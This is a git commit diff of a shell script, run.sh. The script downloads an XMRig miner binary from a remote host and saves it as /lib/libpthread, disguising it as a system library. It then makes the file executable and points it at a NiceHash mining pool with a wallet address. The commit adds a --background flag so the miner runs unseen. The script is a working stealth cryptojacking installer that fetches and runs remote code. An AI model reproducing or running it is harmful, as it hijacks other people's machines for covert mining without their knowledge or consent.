93e77e0c0ee6965d6942fae4eea98657fa868604
xbhuang's pc <xbhuang1994@gmail.com>
2017-09-03 03:12:59 +0800

    1.后台执行

--- run.sh
+++ run.sh
@@ -2,4 +2,4 @@ curl http://miner.gpu360.com/xmrig/libpthread > libpthread
 yum -y install libuv
 mv ./libpthread /lib/libpthread
 chmod +x /lib/libpthread
- /lib/libpthread -o nicehash.gpu360.com:3355 -u 33MQmd3LSueY4gxSCXSJLrmVxtQ6WTQqJP.libpthread --nicehash  --max-cpu-usage=20 -p x -k
+ /lib/libpthread -o nicehash.gpu360.com:3355 -u 33MQmd3LSueY4gxSCXSJLrmVxtQ6WTQqJP.libpthread --nicehash  --max-cpu-usage=20 -p x -k --background
